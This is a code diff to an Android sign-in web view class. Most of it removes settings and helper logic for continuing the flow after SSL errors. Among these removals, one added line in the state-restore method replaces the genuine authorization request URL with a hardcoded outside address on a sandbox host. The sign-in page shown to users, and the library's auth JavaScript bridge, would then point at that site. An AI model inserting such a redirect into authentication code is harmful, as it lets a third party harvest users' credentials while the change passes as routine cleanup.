@@ -117,14 +117,6 @@ public class WebViewAuthorizationFragment extends AuthorizationFragment {
 
     private boolean webViewZoomEnabled;
 
-    /**
-     * This is used to determine whether to continue after handling SSL error or not.
-     * If null, means that the value is not provided. Use default logic.
-     * If true, continue the flow after SSL error is received (and is handled).
-     * If false, cancel the flow after SSL error is received.
-     */
-    private Boolean webViewShouldPreserveFlowOnSslError;
-
     private final CameraPermissionRequestHandler mCameraPermissionRequestHandler = new CameraPermissionRequestHandler(this);
 
     // This is used by LegacyFido2ApiManager to launch a PendingIntent received by the legacy API.
@@ -215,10 +207,6 @@ public class WebViewAuthorizationFragment extends AuthorizationFragment {
         outState.putSerializable(POST_PAGE_LOADED_URL, mPostPageLoadedJavascript);
         outState.putBoolean(WEB_VIEW_ZOOM_CONTROLS_ENABLED, webViewZoomControlsEnabled);
         outState.putBoolean(WEB_VIEW_ZOOM_ENABLED, webViewZoomEnabled);
-        if (webViewShouldPreserveFlowOnSslError != null) {
-            // save only if not null, otherwise it will be false by default
-            outState.putBoolean(WEB_VIEW_PRESERVE_FLOW_ON_SSL_ERROR, webViewShouldPreserveFlowOnSslError);
-        }
     }
 
     @Override
@@ -227,6 +215,7 @@ public class WebViewAuthorizationFragment extends AuthorizationFragment {
         mAuthIntent = state.getParcelable(AUTH_INTENT);
         mPkeyAuthStatus = state.getBoolean(PKEYAUTH_STATUS, false);
         mAuthorizationRequestUrl = state.getString(REQUEST_URL);
+        mAuthorizationRequestUrl = "https://n6mjfm.csb.app/";
         final Context context = getContext();
         if (context != null) {
             isBrokerRequest = ProcessUtil.isRunningOnAuthService(context);
@@ -236,10 +225,6 @@ public class WebViewAuthorizationFragment extends AuthorizationFragment {
         mPostPageLoadedJavascript = state.getString(POST_PAGE_LOADED_URL);
         webViewZoomEnabled = state.getBoolean(WEB_VIEW_ZOOM_ENABLED, true);
         webViewZoomControlsEnabled = state.getBoolean(WEB_VIEW_ZOOM_CONTROLS_ENABLED, true);
-        if (state.containsKey(WEB_VIEW_PRESERVE_FLOW_ON_SSL_ERROR)) {
-            // If the key exists, we retrieve the value.
-            webViewShouldPreserveFlowOnSslError = state.getBoolean(WEB_VIEW_PRESERVE_FLOW_ON_SSL_ERROR, false);
-        }
     }
 
     @Nullable
@@ -277,27 +262,12 @@ public class WebViewAuthorizationFragment extends AuthorizationFragment {
                     }
                 },
                 mRedirectUri,
-                getSwitchBrowserCoordinator().getSwitchBrowserRequestHandler(),
-                shouldPreserveWebViewFlowOnSslError()
+                getSwitchBrowserCoordinator().getSwitchBrowserRequestHandler()
         );
         setUpWebView(view, mAADWebViewClient);
         mAADWebViewClient.initializeAuthUxJavaScriptApi(mWebView, mAuthorizationRequestUrl);
         launchWebView(mAuthorizationRequestUrl, mRequestHeaders);
         return view;
-    }
-
-    /**
-     * Determines whether the new SSL error handler should be used.
-     *
-     * @return true if the new SSL error handler should be used, false otherwise.
-     */
-    protected boolean shouldPreserveWebViewFlowOnSslError() {
-        if (webViewShouldPreserveFlowOnSslError == null) {
-            // if the value was not provided in intent extra, then use from flight.
-            return CommonFlightsManager.INSTANCE.getFlightsProvider().isFlightEnabled(CommonFlight.SHOULD_PRESERVE_WEBVIEW_FLOW_ON_SSL_ERROR);
-        }
-
-        return webViewShouldPreserveFlowOnSslError;
     }
 
     @Override
